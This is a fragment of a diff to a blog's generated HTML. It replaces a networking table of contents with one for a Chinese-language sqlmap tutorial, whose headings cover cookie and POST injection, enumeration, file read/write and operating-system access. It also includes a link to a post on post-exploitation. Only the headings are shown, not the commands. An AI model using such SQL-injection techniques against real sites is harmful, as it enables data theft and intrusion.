           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/12/27/后渗透攻击/" rel="prev" title="后渗透攻击">
-                后渗透攻击 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -735,7 +928,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#物理介质"><span class="nav-number">1.</span> <span class="nav-text">物理介质</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#链路层"><span class="nav-number">2.</span> <span class="nav-text">链路层</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网络层"><span class="nav-number">3.</span> <span class="nav-text">网络层</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IP协议"><span class="nav-number">3.1.</span> <span class="nav-text">IP协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ARP协议"><span class="nav-number">3.2.</span> <span class="nav-text">ARP协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#工作原理："><span class="nav-number">3.2.1.</span> <span class="nav-text">工作原理：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#路由协议"><span class="nav-number">3.3.</span> <span class="nav-text">路由协议</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#传输层"><span class="nav-number">4.</span> <span class="nav-text">传输层</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#应用层"><span class="nav-number">5.</span> <span class="nav-text">应用层</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#全流程"><span class="nav-number">6.</span> <span class="nav-text">全流程</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLmap简介"><span class="nav-number">1.</span> <span class="nav-text">SQLmap简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap支持的数据库"><span class="nav-number">2.</span> <span class="nav-text">sqlmap支持的数据库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#工具使用"><span class="nav-number">3.</span> <span class="nav-text">工具使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本格式"><span class="nav-number">3.1.</span> <span class="nav-text">基本格式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#跟随302跳转"><span class="nav-number">3.2.</span> <span class="nav-text">跟随302跳转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie注入"><span class="nav-number">3.3.</span> <span class="nav-text">cookie注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#从post数据包中注入"><span class="nav-number">3.4.</span> <span class="nav-text">从post数据包中注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#注入成功后"><span class="nav-number">4.</span> <span class="nav-text">注入成功后</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#获取数据库基本信息"><span class="nav-number">4.1.</span> <span class="nav-text">获取数据库基本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#从数据库中搜索字段"><span class="nav-number">4.2.</span> <span class="nav-text">从数据库中搜索字段</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读取与写入文件"><span class="nav-number">4.3.</span> <span class="nav-text">读取与写入文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap详细命令"><span class="nav-number">5.</span> <span class="nav-text">sqlmap详细命令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Options（选项）"><span class="nav-number">5.1.</span> <span class="nav-text">Options（选项）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Target（目标）"><span class="nav-number">5.2.</span> <span class="nav-text">Target（目标）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Request（请求）："><span class="nav-number">5.3.</span> <span class="nav-text">Request（请求）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration（枚举）"><span class="nav-number">5.4.</span> <span class="nav-text">Enumeration（枚举）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Optimization（优化）"><span class="nav-number">5.5.</span> <span class="nav-text">Optimization（优化）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Injection（注入）"><span class="nav-number">5.6.</span> <span class="nav-text">Injection（注入）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Detection（检测）："><span class="nav-number">5.7.</span> <span class="nav-text">Detection（检测）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Techniques（技巧）："><span class="nav-number">5.8.</span> <span class="nav-text">Techniques（技巧）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fingerprint（指纹）"><span class="nav-number">5.9.</span> <span class="nav-text">Fingerprint（指纹）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Brute-force（蛮力）："><span class="nav-number">5.10.</span> <span class="nav-text">Brute force（蛮力）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#User-defined-function-injection（用户自定义函数注入）："><span class="nav-number">5.11.</span> <span class="nav-text">User-defined function injection（用户自定义函数注入）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-system-access（访问文件系统）："><span class="nav-number">5.12.</span> <span class="nav-text">File system access（访问文件系统）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Operating-system-access（操作系统访问）："><span class="nav-number">5.13.</span> <span class="nav-text">Operating system access（操作系统访问）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows注册表访问："><span class="nav-number">5.14.</span> <span class="nav-text">Windows注册表访问：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Miscellaneous（杂项）："><span class="nav-number">5.15.</span> <span class="nav-text">Miscellaneous（杂项）：</span></a></li></ol></li></ol></div>
             
 
           </div>
